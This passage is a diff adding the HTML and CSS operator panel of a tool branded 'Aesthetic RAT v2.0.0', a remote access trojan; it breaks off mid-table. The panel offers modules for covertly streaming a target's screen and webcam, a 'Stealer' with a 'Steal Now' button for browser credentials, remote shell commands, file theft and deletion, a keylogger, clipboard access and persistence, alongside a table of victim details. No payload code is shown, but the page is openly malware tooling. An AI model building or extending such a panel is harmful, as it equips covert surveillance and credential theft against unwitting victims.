@@ -1,0 +1,1638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client Control — Aesthetic</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Client page layout */
+        .client-page {
+            display: flex;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+        }
+
+        /* Module sidebar — reuses main sidebar styling */
+        .module-sidebar {
+            width: 260px;
+            min-width: 260px;
+            background-color: var(--bg-surface);
+            backdrop-filter: blur(35px) saturate(180%);
+            -webkit-backdrop-filter: blur(35px) saturate(180%);
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            position: fixed;
+        }
+
+        .module-sidebar-header {
+            padding: 28px 22px 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .module-sidebar-header .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-bottom: 16px;
+            padding: 6px 12px;
+            border-radius: 8px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .module-sidebar-header .back-link:hover {
+            color: var(--primary);
+            background: var(--primary-glow);
+            border-color: rgba(212, 175, 55, 0.15);
+        }
+
+        .module-sidebar-header .client-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .module-sidebar-header .client-status-pill {
+            margin-top: 8px;
+        }
+
+        /* Module nav — reuses nav-btn pattern */
+        .module-nav {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .module-nav-item {
+            background: none;
+            border: 1px solid transparent;
+            color: var(--text-secondary);
+            padding: 11px 16px;
+            border-radius: 12px;
+            text-align: left;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            font-family: var(--font-sans);
+        }
+
+        .module-nav-item:hover {
+            background-color: rgba(255, 255, 255, 0.03);
+            color: var(--text-primary);
+            transform: translateX(2px);
+        }
+
+        .module-nav-item.active {
+            background-color: var(--primary-glow);
+            color: var(--primary);
+            border: 1px solid rgba(212, 175, 55, 0.15);
+        }
+
+        .module-nav-item svg {
+            flex-shrink: 0;
+            opacity: 0.7;
+        }
+
+        .module-nav-item.active svg {
+            opacity: 1;
+        }
+
+        .module-nav-divider {
+            height: 1px;
+            background: var(--border-color);
+            margin: 6px 8px;
+        }
+
+        /* Main content area */
+        .module-content {
+            margin-left: 260px;
+            flex: 1;
+            overflow-y: auto;
+            padding: 45px 60px;
+            min-height: 100vh;
+        }
+
+        .module-panel {
+            display: none;
+            animation: fadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        .module-panel.active {
+            display: block;
+        }
+
+        /* Info table inside panel-card */
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .info-table tr {
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .info-table tr:last-child {
+            border-bottom: none;
+        }
+
+        .info-table td {
+            padding: 12px 16px;
+            font-size: 13px;
+            vertical-align: top;
+        }
+
+        .info-table td:first-child {
+            color: var(--text-muted);
+            font-weight: 600;
+            width: 150px;
+            white-space: nowrap;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-table td:last-child {
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 13px;
+            word-break: break-all;
+        }
+
+        /* Comment box */
+        .comment-box {
+            margin-top: 20px;
+        }
+
+        .comment-box textarea {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            font-size: 13px;
+            padding: 12px 16px;
+            resize: vertical;
+            min-height: 70px;
+            outline: none;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+        }
+
+        .comment-box textarea:focus {
+            border-color: rgba(212, 175, 55, 0.4);
+            background-color: rgba(255, 255, 255, 0.06);
+        }
+
+        .comment-box label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        /* Module placeholder */
+        .module-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 300px;
+            color: var(--text-muted);
+            gap: 16px;
+            background-color: rgba(255, 255, 255, 0.01);
+            border: 1px dashed var(--border-color);
+            border-radius: 14px;
+        }
+
+        .module-placeholder svg {
+            opacity: 0.2;
+        }
+
+        .module-placeholder span {
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Sidebar footer on client page */
+        .module-sidebar-footer {
+            padding: 16px 22px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        /* Mobile hamburger toggle */
+        .mobile-menu-toggle {
+            display: none;
+            position: fixed;
+            top: 16px;
+            left: 16px;
+            z-index: 1100;
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            color: var(--text-primary);
+            cursor: pointer;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-sidebar-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 999;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .mobile-sidebar-overlay.visible {
+            opacity: 1;
+        }
+
+        @media (max-width: 1024px) {
+            .module-sidebar {
+                width: 220px;
+                min-width: 220px;
+            }
+            .module-content {
+                margin-left: 220px;
+                padding: 30px 24px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-toggle {
+                display: flex;
+            }
+
+            .module-sidebar {
+                width: 280px;
+                min-width: 280px;
+                transform: translateX(-100%);
+                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+                z-index: 1000;
+            }
+
+            .module-sidebar.open {
+                transform: translateX(0);
+            }
+
+            .mobile-sidebar-overlay {
+                display: block;
+                pointer-events: none;
+            }
+
+            .mobile-sidebar-overlay.visible {
+                pointer-events: auto;
+            }
+
+            .module-content {
+                margin-left: 0;
+                padding: 72px 16px 24px;
+                width: 100%;
+            }
+
+            .module-content .header h2 {
+                font-size: 20px;
+            }
+
+            .module-content .header .subtitle {
+                font-size: 12px;
+            }
+
+            .panel-card {
+                padding: 16px;
+            }
+
+            .info-table td:first-child {
+                width: auto;
+                min-width: 90px;
+                font-size: 10px;
+                padding: 10px 8px;
+            }
+
+            .info-table td:last-child {
+                font-size: 12px;
+                padding: 10px 8px;
+            }
+
+            /* RDP controls stack vertically */
+            #mod-remote-desktop .panel-card div[style*="display:flex"] {
+                flex-direction: column;
+                gap: 14px !important;
+            }
+
+            #rdp-status {
+                margin-left: 0 !important;
+                text-align: center;
+            }
+
+            .module-placeholder {
+                height: 200px;
+            }
+
+            .module-placeholder svg {
+                width: 36px;
+                height: 36px;
+            }
+
+            .module-nav-item {
+                min-height: 44px;
+            }
+
+            .btn, .btn-submit, .btn-primary, .btn-outline, .btn-danger {
+                min-height: 44px;
+            }
+
+            .comment-box textarea {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .module-content {
+                padding: 68px 12px 20px;
+            }
+
+            .module-sidebar {
+                width: 260px;
+                min-width: 260px;
+            }
+
+            .module-sidebar-header {
+                padding: 20px 16px 16px;
+            }
+
+            .module-nav {
+                padding: 8px;
+            }
+
+            .module-nav-item {
+                font-size: 13px;
+                padding: 10px 12px;
+                gap: 10px;
+            }
+
+            .info-table td {
+                display: block;
+                width: 100%;
+                padding: 4px 8px;
+            }
+
+            .info-table td:first-child {
+                padding-top: 10px;
+                padding-bottom: 0;
+            }
+
+            .info-table td:last-child {
+                padding-bottom: 10px;
+                padding-top: 4px;
+            }
+
+            .info-table tr {
+                display: block;
+            }
+
+            .module-content .header h2 {
+                font-size: 18px;
+            }
+
+            .panel-card h3 {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body class="theme-default">
+    <div class="background-overlay"></div>
+
+    <!-- Mobile hamburger toggle -->
+    <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle menu">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+
+    <!-- Mobile overlay -->
+    <div class="mobile-sidebar-overlay" id="mobile-overlay"></div>
+
+    <div class="client-page">
+        <!-- Left module sidebar -->
+        <div class="module-sidebar" id="module-sidebar">
+            <div class="module-sidebar-header">
+                <a href="/" class="back-link">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+                    Back to panel
+                </a>
+                <div class="client-name" id="client-name">Loading...</div>
+                <div class="client-status-pill status-offline" id="status-pill">
+                    <span class="status-dot"></span>
+                    <span class="status-text" id="status-text">Checking...</span>
+                </div>
+            </div>
+
+            <nav class="module-nav">
+                <button class="module-nav-item active" data-module="information">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                    Information
+                </button>
+                <button class="module-nav-item" data-module="remote-desktop">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                    Remote Desktop
+                </button>
+                <button class="module-nav-item" data-module="remote-camera">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                    Remote Camera
+                </button>
+                <button class="module-nav-item" data-module="stealer">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    Stealer
+                </button>
+
+                <div class="module-nav-divider"></div>
+
+                <button class="module-nav-item" data-module="file-manager">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                    File Manager
+                </button>
+                <button class="module-nav-item" data-module="terminal">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    Terminal
+                </button>
+                <button class="module-nav-item" data-module="keylogger">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
+                    KeyLogger
+                </button>
+                <button class="module-nav-item" data-module="clipboard">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
+                    Clipboard
+                </button>
+
+                <div class="module-nav-divider"></div>
+
+                <button class="module-nav-item" data-module="task-manager">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+                    Task Manager
+                </button>
+                <button class="module-nav-item" data-module="persistence">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    Persistence
+                </button>
+                <button class="module-nav-item" data-module="power">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
+                    Power
+                </button>
+            </nav>
+
+            <div class="module-sidebar-footer">
+                <span class="version-tag">Aesthetic RAT v2.0.0</span>
+            </div>
+        </div>
+
+        <!-- Main content area -->
+        <div class="module-content">
+
+            <!-- Information -->
+            <div class="module-panel active" id="mod-information">
+                <header class="header">
+                    <h2>PC Information</h2>
+                    <p class="subtitle">System details and hardware specifications</p>
+                </header>
+
+                <div class="panel-card">
+                    <h3>System Info</h3>
+                    <table class="info-table" id="info-table">
+                        <tr><td>Username:</td><td id="info-username">—</td></tr>
+                        <tr><td>PC-name:</td><td id="info-hostname">—</td></tr>
+                        <tr><td>Client ID:</td><td id="info-client-id">—</td></tr>
+                        <tr><td>IP:</td><td id="info-ip">—</td></tr>
+                        <tr><td>Country:</td><td id="info-country">—</td></tr>
+                        <tr><td>System:</td><td id="info-os">—</td></tr>
+                        <tr><td>Admin Rights:</td><td id="info-admin">—</td></tr>
+                        <tr><td>Last Active:</td><td id="info-last-active">—</td></tr>
+                        <tr><td>First Seen:</td><td id="info-first-seen">—</td></tr>
+                    </table>
+                </div>
+
+                <div class="panel-card">
+                    <h3>Notes</h3>
+                    <div class="comment-box">
+                        <label>Comment</label>
+                        <textarea id="client-comment" placeholder="Add a note about this client..."></textarea>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Remote Desktop -->
+            <div class="module-panel" id="mod-remote-desktop">
+                <header class="header">
+                    <h2>Remote Desktop</h2>
+                    <p class="subtitle">View and control the target's screen in real-time</p>
+                </header>
+
+                <!-- Controls -->
+                <div class="panel-card" style="margin-bottom:16px;">
+                    <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="rdp-toggle-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            Start Stream
+                        </button>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Mode</label>
+                            <select id="rdp-mode" style="background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:var(--text-primary);padding:6px 12px;border-radius:8px;font-size:12px;outline:none;cursor:pointer;">
+                                <option value="1" style="background:#151518;color:#fff;">Tile Delta (Fast Stream)</option>
+                                <option value="2" style="background:#151518;color:#fff;">High Quality Text (WebRTC Quality)</option>
+                                <option value="0" style="background:#151518;color:#fff;">Standard</option>
+                            </select>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
+                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="30" value="10" style="width:100px;">
+                            <span id="rdp-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
+                            <input type="range" class="slider-range" id="rdp-quality" min="10" max="100" value="60" step="5" style="width:100px;">
+                            <span id="rdp-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">60%</span>
+                        </div>
+
+                        <span id="rdp-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
+                    </div>
+                </div>
+
+                <!-- Screen view -->
+                <div class="panel-card" style="padding:0;overflow:hidden;background:rgba(0,0,0,0.4);">
+                    <div id="rdp-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:400px;color:var(--text-muted);gap:16px;">
+                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="opacity:0.15;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                        <span style="font-size:13px;">Press Start Stream to begin</span>
+                    </div>
+                    <img id="rdp-frame" style="display:none;width:100%;height:auto;" alt="Remote Desktop">
+                </div>
+            </div>
+
+            <!-- Remote Camera -->
+            <div class="module-panel" id="mod-remote-camera">
+                <header class="header">
+                    <h2>Remote Camera</h2>
+                    <p class="subtitle">Access the target's webcam feed in real-time</p>
+                </header>
+
+                <!-- Controls -->
+                <div class="panel-card" style="margin-bottom:16px;">
+                    <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="cam-toggle-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            Start Camera
+                        </button>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
+                            <input type="range" class="slider-range" id="cam-fps" min="1" max="30" value="10" style="width:100px;">
+                            <span id="cam-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
+                            <input type="range" class="slider-range" id="cam-quality" min="10" max="100" value="60" step="5" style="width:100px;">
+                            <span id="cam-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">60%</span>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Device</label>
+                            <select id="cam-select" style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:var(--text-main);padding:6px 12px;border-radius:6px;font-size:12px;outline:none;">
+                                <option value="0">Scanning devices...</option>
+                            </select>
+                        </div>
+
+                        <span id="cam-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
+                    </div>
+                </div>
+
+                <!-- Camera View -->
+                <div class="panel-card" style="padding:0;overflow:hidden;background:rgba(0,0,0,0.4);">
+                    <div id="cam-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:400px;color:var(--text-muted);gap:16px;">
+                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="opacity:0.15;"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                        <span style="font-size:13px;">Press Start Camera to begin</span>
+                    </div>
+                    <img id="cam-frame" style="display:none;width:100%;height:auto;" alt="Remote Camera">
+                </div>
+            </div>
+
+            <!-- Stealer -->
+            <div class="module-panel" id="mod-stealer">
+                <header class="header">
+                    <h2>Stealer</h2>
+                    <p class="subtitle">Collect browser data, credentials, and system information</p>
+                </header>
+                <div class="panel-card">
+                    <div style="display:flex;gap:12px;margin-bottom:20px;">
+                        <button class="btn btn-primary" id="btn-steal-now">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                            Steal Now
+                        </button>
+                    </div>
+                    <div id="steal-logs-list">
+                        <div class="module-placeholder">
+                            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                            <span>No logs collected yet. Press Steal Now.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- File Manager -->
+            <div class="module-panel" id="mod-file-manager">
+                <header class="header">
+                    <h2>File Manager</h2>
+                    <p class="subtitle">Browse, download, upload and delete files on the target</p>
+                </header>
+                <div class="panel-card">
+                    <!-- Toolbar -->
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                        <button class="btn btn-secondary" id="fm-btn-up" onclick="fmNavigateUp()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="18 15 12 9 6 15"/></svg>Up
+                        </button>
+                        <button class="btn btn-secondary" onclick="fmRefresh()" style="padding:6px 12px;font-size:12px;">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>Refresh
+                        </button>
+                        <button class="btn btn-secondary" id="fm-btn-download" onclick="fmDownloadSelected()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download
+                        </button>
+                        <button class="btn btn-danger" id="fm-btn-delete" onclick="fmDeleteSelected()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg>Delete
+                        </button>
+                        <label class="btn btn-secondary" style="padding:6px 12px;font-size:12px;cursor:pointer;margin:0;">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Upload
+                            <input type="file" id="fm-upload-input" style="display:none;" onchange="fmUploadFile(this)">
+                        </label>
+                        <span id="fm-status" style="font-size:12px;color:var(--text-muted);margin-left:4px;"></span>
+                    </div>
+                    <!-- Breadcrumb -->
+                    <div id="fm-breadcrumb" style="display:flex;align-items:center;gap:4px;padding:6px 10px;background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:6px;margin-bottom:10px;font-size:12px;font-family:var(--font-mono);flex-wrap:wrap;min-height:32px;"></div>
+                    <!-- File Table -->
+                    <div style="overflow-x:auto;border:1px solid var(--border-color);border-radius:8px;">
+                        <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                            <thead>
+                                <tr style="background:rgba(255,255,255,0.04);text-align:left;">
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:36px;"></th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;">Name</th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:90px;">Size</th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:140px;">Modified</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fm-tbody">
+                                <tr><td colspan="4" style="text-align:center;padding:40px;color:var(--text-muted);">Click Refresh to load files</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Terminal -->
+            <div class="module-panel" id="mod-terminal">
+                <header class="header">
+                    <h2>Terminal</h2>
+                    <p class="subtitle">Execute shell commands on the target machine</p>
+                </header>
+                <div class="panel-card">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+                        <div style="display:flex;gap:8px;">
+                            <button class="btn btn-primary" id="term-mode-cmd" onclick="setTerminalShell('cmd')" style="padding:6px 14px;font-size:12px;">CMD</button>
+                            <button class="btn btn-secondary" id="term-mode-ps" onclick="setTerminalShell('ps')" style="padding:6px 14px;font-size:12px;">PowerShell</button>
+                        </div>
+                        <button class="btn btn-secondary" onclick="clearTerminalOutput()" style="padding:6px 12px;font-size:12px;">Clear Output</button>
+                    </div>
+                    <div id="terminal-screen" style="background:#0a0a0c;border:1px solid var(--border-color);border-radius:8px;padding:12px;font-family:var(--font-mono);font-size:13px;color:#a0a0b0;height:380px;overflow-y:auto;margin-bottom:12px;white-space:pre-wrap;word-break:break-all;">Microsoft Windows [Version 10.0.22621.1]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\&gt;</div>
+                    <div style="display:flex;gap:8px;">
+                        <span id="term-prompt-label" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);align-self:center;font-weight:bold;">C:\&gt;</span>
+                        <input type="text" id="term-input" placeholder="Type a command and press Enter..." style="flex:1;background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:#fff;padding:8px 12px;border-radius:8px;font-family:var(--font-mono);font-size:13px;outline:none;" onkeydown="if(event.key==='Enter') sendTerminalCommand()">
+                        <button class="btn btn-primary" onclick="sendTerminalCommand()">Send</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- KeyLogger -->
+            <div class="module-panel" id="mod-keylogger">
+                <header class="header">
+                    <h2>KeyLogger</h2>
+                    <p class="subtitle">Monitor keystrokes in real-time</p>
+                </header>
+                <div class="panel-card">
+                    <div class="module-placeholder">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
+                        <span>KeyLogger — coming soon</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Clipboard -->
+            <div class="module-panel" id="mod-clipboard">
+                <header class="header">
+                    <h2>Clipboard</h2>
+                    <p class="subtitle">View and modify clipboard contents</p>
+                </header>
+                <div class="panel-card">
+                    <div class="module-placeholder">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
+                        <span>Clipboard — coming soon</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Task Manager -->
+            <div class="module-panel" id="mod-task-manager">
+                <header class="header">
+                    <h2>Task Manager</h2>
+                    <p class="subtitle">View and manage running processes</p>
+                </header>
+                <div class="panel-card">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+                        <button class="btn btn-primary" onclick="fetchTaskManagerList()" style="padding:6px 14px;font-size:12px;">
+                            Refresh Processes
+                        </button>
+                        <span id="taskmgr-count" style="font-size:12px;color:var(--text-muted);">0 processes</span>
+                    </div>
+                    <div style="max-height:420px;overflow-y:auto;border:1px solid var(--border-color);border-radius:8px;">
+                        <table class="info-table" style="width:100%;">
+                            <thead>
